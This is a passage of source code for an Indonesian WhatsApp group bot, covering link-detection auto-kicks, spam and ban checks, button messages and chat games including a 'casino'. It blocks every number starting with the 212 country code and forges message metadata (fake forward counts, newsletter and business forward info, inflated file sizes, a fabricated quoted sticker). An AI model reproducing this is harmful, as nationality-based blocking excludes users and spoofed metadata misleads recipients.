if (budy.match(`chat.whatsapp.com`)) {
if (!isBotAdmins) return danger(`*Bot Bukan Admin!*\n\nKali ini Anda selamat🥸`)
let gclink = (`https://chat.whatsapp.com/`+await vreden.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
if (isAdmins) return
if (isCreator) return
if (isAntilinkk2(m.sender, isPremium, isCreator, Antilink2Count, Antilinkk2)) {
await vreden.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup lebih dari *${Antilink2Count}X*\n\nByee byee parasitt~~`)
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
resetAntilink2(m.sender, parseInt(Antilink2Count), Antilinkk2)
return 
} else {
await vreden.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf pesan kamu telah kami hapus`)
Antilink2Add(m.sender, Antilinkk2)
}
}
}

//━━━━━━━━━━━━━━━[ ANTI LINK TIKTOK ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].antilinktt) {
if (budy.match(`tiktok.com`)) {
if (!isBotAdmins) return 
if (isAdmins) return 
if (isCreator) return 
danger(`*「 TIKTOK LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
await vreden.sendMessage(m.chat, { delete: m.key })
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

//━━━━━━━━━━━━━━━[ KICK ME ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].kickme) {
if (budy.match(`in kel`)) {
await m.reply(`Siap Laksanakan`)
if (!isBotAdmins) return warning(`Anjir lupa gw bukan admin`)
if (isAdmins) return warning(`Kenapa Mau Out Sayang🥺`)
if (isCreator) return warning(`Kenapa Mau Out Sayang🥺`)
m.reply(`Done Awokwok`) 
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}


//━━━━━━━━━━━━━━━[ AUTO BLOCK 212 ]━━━━━━━━━━━━━━━━━//
if (m.sender.startsWith('212') && setting.autoblok212 === true) {
return vreden.updateBlockStatus(m.sender, 'block')
}

//━━━━━━━━━━━━━━━[ BANNED, SPAM, ADDCMD COUNT && CONSOLE ]━━━━━━━━━━━━━━━━━//
// add count command && spam detektor && ban account
if (isCmd && !isCreator && !m.key.fromMe) {
addCountCmd(`${command}`, m.sender, _cmd)
if (spamdetek.isFiltered(m.sender)) return vreden.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})
spamdetek.addFilter(m.sender)
if (isBan) return danger(`Akun Anda Telah Dibanned!!`)
}

//first chat 
if (body) {
console.log('\x1b[1;31m~\x1b[1;37m>', `[\x1b[1;32m ${vreden.user.name} \x1b[1;37m]`, time, chalk.green(budy.slice(0, 100) || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
if (!m.isGroup && isCmd && !m.key.fromMe) { 
db.data.users[m.sender].pctime = new Date * 1
}
if (!m.isGroup && !isCmd && !m.key.fromMe) { 
if (new Date() - db.data.users[m.sender].pctime > 21600000) {
db.data.users[m.sender].pctime = new Date * 1
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Menu\",\"id\":\".menu\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Ping\",\"id\":\".ping\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Welcome ${usernomor}👋*\n`, `Ada yang bisa dibantu kak?`, button)
}
}
}
//━━━━━━━━━━━━━━━[ GRUP, PC ONLY AND MUTE ]━━━━━━━━━━━━━━━━━//
if (isCmd && !isPremium) {
if(!isCreator && setting.gruponly && !m.isGroup){
let grupe = `
Bot hanya dapat digunakan
didalam grup, chat owner
untuk info lebih lanjut.
`
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Tolong+Matikan+Mode+Grup+Onlynya+Cuyy\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Tolong+Matikan+Mode+Grup+Onlynya+Cuyy\"}`
              }
           ]
let buffer = await getBuffer("https://telegra.ph/file/fb7b3703f76277ee4eb25.png")
return sendButtonDocImage(m.chat, '*Mode Grup Only*', grupe, buffer, button)
}
if(!isCreator && setting.pconly && m.isGroup){
return
}
if (m.isGroup && db.data.chats[m.chat].mute) {
if (!isAdmins && !isCreator) return
}
}

//━━━━━━━━━━━━━━━[ ANTILINK WA ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].antiwame) {
if (budy.match(`wa.me|Wa.me`)) {
danger(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
if (!isBotAdmins) return warning(`Anjir lupa gw bukan admin`)
if (isAdmins) return warning(`Gajadi, Kamu admin`)
if (isCreator) return warning(`Gajadi, Kamu ownerku`)
await vreden.sendMessage(m.chat, { delete: m.key })
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (m.isGroup && db.data.chats[m.chat].antiwame2 && !db.data.chats[m.chat].antiwame && !isCreator && !isAdmins && isBotAdmins){
if (budy.match(`wa.me`)){
if (!isBotAdmins) return //m.reply(`Untung bot bukan admin`)
await vreden.sendMessage(m.chat, { delete: m.key })
}
}

//━━━━━━━━━━━━━━━[ RESPON CMD ]━━━━━━━━━━━━━━━━━//

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: vreden.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, vreden.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
vreden.ev.emit('messages.upsert', msg)
}

async function ribuan(bilangan) {
var	reverse = bilangan.toString().split('').reverse().join(''),
	ribuan 	= reverse.match(/\d{1,3}/g);
	ribuan	= ribuan.join('.').split('').reverse().join('');
return ribuan
}

//━━━━━━━━━━━━━━━[ SEND MESSAGE && BUTTON]━━━━━━━━━━━━━━━━━//
async function sendButtonBiasa(chat, judul, teks, button) {
let msg = generateWAMessageFromContent(chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
        contextInfo: {
          mentionedJid: ments(teks),
          forwardingScore: 9999999, 
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
          newsletterJid: idsaluran,
          newsletterName: `${namasaluran}`, 
          serverMessageId: -1
          },
          businessMessageForwardInfo: { businessOwnerJid: vreden.decodeJid(vreden.user.id) },
          },
            body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: judul,
            subtitle: "Yahya Almuthahar",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: button,
          })
        })
    }
  }
}, { quoted: m })

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}

async function sendButtonImage(chat, judul, teks, buffer, button) {
const uploadFile = { upload: vreden.waUploadToServer };        
var imageMessage = await prepareWAMessageMedia(
          {
            image: buffer,
          },
          uploadFile,
        );
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
          mentionedJid: ments(teks),
          forwardingScore: 9999999, 
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
          newsletterJid: idsaluran,
          newsletterName: `${namasaluran}`, 
          serverMessageId: -1
          },
          businessMessageForwardInfo: { businessOwnerJid: vreden.decodeJid(vreden.user.id) },
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: judul,
            subtitle: "Yahya Almuthahar",
            imageMessage: imageMessage.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: button,
          })
        })
    }
  }
}, { quoted: m })

vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}

async function sendButtonDocImage(chat, judul, teks, buffer, button) {
let msg = generateWAMessageFromContent(chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
          mentionedJid: ments(teks),
          forwardingScore: 9999999, 
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
          newsletterJid: idsaluran,
          newsletterName: `${namasaluran}`, 
          serverMessageId: -1
          },
          businessMessageForwardInfo: { businessOwnerJid: vreden.decodeJid(vreden.user.id) },
          },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: footxt
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: judul,
                    thumbnailUrl: pathimg,
                    gifPlayback: true,
                    subtitle: "Yahya Almuthahar",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: buffer,
                    mimetype: "png/img",
                        fileLength: 10000000000,
                        jpegThumbnail: buffer,
                        fileName: `${namasaluran}`,
                     }, {
                        upload: vreden.waUploadToServer
                    }))
                }),
                gifPlayback: true,
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: button,
          })
        })
    }
  }
}, { quoted: m })

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}

async function sendButtonDocThumbnail(chat, judul, teks, thumb, button) {
let msg = generateWAMessageFromContent(chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: ments(teks),
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: idsaluran,
                        newsletterName: `${namasaluran}`, 
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: vreden.decodeJid(vreden.user.id)
                    },
                    externalAdReply: {
                        title: ucapanWaktu,
                        body: "Selamat Beraktifitas ~~",
                        thumbnailUrl: thumb,
                        sourceUrl: '',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: footxt
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: judul,
                    thumbnailUrl: thumb,
                    gifPlayback: true,
                    subtitle: "Yahya Almuthahar",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: fs.readFileSync('./media/thumbnail.jpg'),
                    mimetype: "image/png",
                        fileLength: 10000000000,
                        jpegThumbnail:fs.readFileSync("./media/thumbnail.jpg"),
                        fileName: `${namasaluran}`,
                     }, {
                        upload: vreden.waUploadToServer
                    }))
                }),
                gifPlayback: true,
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: button,
          })
        })
    }
  }
}, { quoted: m })

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}

async function balas(teks) {
const nedd = { text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true }}

vreden.sendMessage(m.chat, nedd, {
        quoted: m,
      });
      }

async function mbales(teks) {
vreden.sendTextWithMentions(m.chat, teks, m)
}

async function bales(teks) {
vreden.sendText(m.chat, teks, fconver)
}

async function tolakk(teks) {
const nedd = { text: teks,
contextInfo:{
mentionedJid: ments(teks),
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: `🚫ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ🚫`,
body: footxt,
previewType: "PHOTO",
thumbnailUrl: `https://telegra.ph/file/6571edf4e696989e59c3a.png`, 
sourceUrl: tiktokk}}
};
      return vreden.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }

async function warning(teks) {
const nedd = { text: teks,
contextInfo:{
mentionedJid: ments(teks),
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: `⚠️ᴡᴀʀɴɪɴɢ⚠️`,
body: footxt,
previewType: "PHOTO",
thumbnailUrl: `https://telegra.ph/file/905b071a50c21eaad0f09.png`, 
sourceUrl: tiktokk}}
};
      return vreden.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }

async function danger(teks) {
const nedd = { text: teks,
contextInfo:{
mentionedJid: ments(teks),
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: `☠️ᴅᴀɴɢᴇʀ☠️`,
body: footxt,
previewType: "PHOTO",
thumbnailUrl: `https://telegra.ph/file/5205e68fead75ede642b9.png`,
sourceUrl: tiktokk}}
};
      return vreden.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }
    
async function newReply(teks) {
const nedd = { text: teks,
contextInfo:{
mentionedJid: ments(teks),
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: ucapanWaktu,
body: `Jangan Lupa Bernafas ^_^`,
previewType: "PHOTO",
thumbnailUrl: pathimg, 
sourceUrl: instagram}}
};
      return vreden.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }

async function editp (teks1, teks2, teks3) {
var nedd = [
`${teks1}`, 
`${teks2}`, 
`${teks3}`
]
let { key } = await vreden.sendMessage(m.chat, {text: 'Loading'}, {quoted: bakkk })

for (let i = 0; i < nedd.length; i++) {
await delay(2000)
await vreden.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
async function loading () {
var nedd = [
"Loading [ 3% ]", 
"Loading [ 7% ]", 
"Loading [ 14% ]", 
"Loading [ 19% ]", 
"Loading [ 26% ]",
"Loading [ 31% ]",
"Loading [ 33% ]",
"Loading [ 38% ]",
"Loading [ 42% ]",
"Loading [ 46% ]",
"Loading [ 54% ]",
"Loading [ 67% ]",
"Loading [ 75% ]",
"Loading [ 98% ]",
"Loading Selesai..."
]
let { key } = await vreden.sendMessage(m.chat, {text: 'Loading'})

for (let i = 0; i < nedd.length; i++) {
await delay(10)
await vreden.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
const vredena = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

//━━━━━━━━━━━━━━━[ GAME FUNCTION ]━━━━━━━━━━━━━━━━━//
let pilih = "🌀", bomb = "💣";
if (petakbom[m.sender]) {
if (!/^[1-9]|10$/i.test(body)) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 2) {
petakbom[m.sender].board[parseInt(body) - 1] = bomb;
petakbom[m.sender].pick++;
petakbom[m.sender].bomb--;
petakbom[m.sender].nyawa.pop();

let brd = petakbom[m.sender].board;
if (petakbom[m.sender].nyawa.length < 1) {
await balas(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\n*Terpilih :* ${petakbom[m.sender].pick}\n\n🤣 Padahal gampang`);
delete petakbom[m.sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa nyawa: ${petakbom[m.sender].nyawa}`);
return !0;
}
if (petakbom[m.sender].petak[parseInt(body) - 1] === 0) {
petakbom[m.sender].petak[parseInt(body) - 1] = 1;
petakbom[m.sender].board[parseInt(body) - 1] = pilih;
petakbom[m.sender].pick++;
petakbom[m.sender].lolos--;
let brd = petakbom[m.sender].board;
if (petakbom[m.sender].lolos < 1) {
await balas(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\n*Terpilih :* ${petakbom[m.sender].pick}\n*Sisa nyawa :* ${petakbom[m.sender].nyawa}\n*Bomb :* ${petakbom[m.sender].bomb}\n*Hadiah Saldo :* Rp. 2500`);
db.data.users[m.sender].saldo += 2500
delete petakbom[m.sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih : ${petakbom[m.sender].pick}\nSisa nyawa : ${petakbom[m.sender].nyawa}\nBomb : ${petakbom[m.sender].bomb}`)
}
}

//TicTacToe
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
mbales(`@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
mbales(`Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`)
if (!roof.pilih) vreden.sendMessage(roof.p, { text: `Silahkan pilih \n\nBatu\nKertas\nGunting`})
if (!roof.pilih2) vreden.sendMessage(roof.p2, { text: `Silahkan pilih \n\nBatu\nKertas\nGunting`})
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) m.reply(`Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
mbales(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) vreden.sendMessage(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) vreden.sendMessage(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
vreden.sendMessage(roof.asal, { text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}`.trim()}, m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

${isWin ? `@${winner.split('@')[0]} Selamat Untukmu🎊🎊!` : isTie ? `Sesi Game Telah Berakhir` : `Ketik *nyerah* untuk menyerah dan mengakui kekalahan`}
`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await vreden.sendText(room.x, str, m, { mentions: parseMention(str) } )
await vreden.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//`
if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'n') {
vreden.sendMessage(m.chat, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
vreden.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
db.data.users[`${casinoo.Z}@s.whatsapp.net`].saldo += nebal(casinoo.nominal)
db.data.users[`${casinoo.Y}`].saldo -= nebal(casinoo.nominal)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
vreden.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
db.data.users[`${casinoo.Y}`].saldo += nebal(casinoo.nominal)
db.data.users[`${casinoo.Z}@s.whatsapp.net`].saldo -= nebal(casinoo.nominal)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
vreden.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}
//game
const JwbTrue = (tebak, exp) => {
return`*🎮 ${tebak} 🎮*\n\nJawaban Benar 🎉\n+Rp ${exp} saldo`
}
const waktuHabis = (jawaban) => {
return `Waktu Habis\nJawaban: *${jawaban}*`
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]][0]
 hadiah = kuismath[m.sender.split('@')[0]][1]
 if (budy.toLowerCase() == jawaban) {
m.reply(` 🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+Rp ${hadiah} saldo` + `\n\nKirim perintah .math\nuntuk bermain lagi 🎮`)
db.data.users[m.sender].saldo += hadiah
delete kuismath[m.sender.split('@')[0]]
 } 
}
if (('family100' + m.chat in _family100) && !isCmd) {
 kuis = true
let room = _family100['family100' + m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
 if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
 }
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
 vreden.sendTextWithMentions(m.chat, caption, m)
.then(mes => {
return _family100['family100' + m.chat].pesan = mesg
}).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100' + m.chat]
}
if (tebakgame[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgame[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakgame[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Game", tebakgame[m.chat][2]) + `\n\nKirim perintah .tebakgame\nuntuk bermain lagi 🎮`)
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakhero[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakhero[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakhero[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakhero[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Hero", tebakhero[m.chat][2]) + `\n\nKirim perintah .tebakhero\nuntuk bermain lagi 🎮`)
clearTimeout(tebakhero[m.chat][3])
delete tebakhero[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakff[m.chat] && !isCmd && m.quoted) {
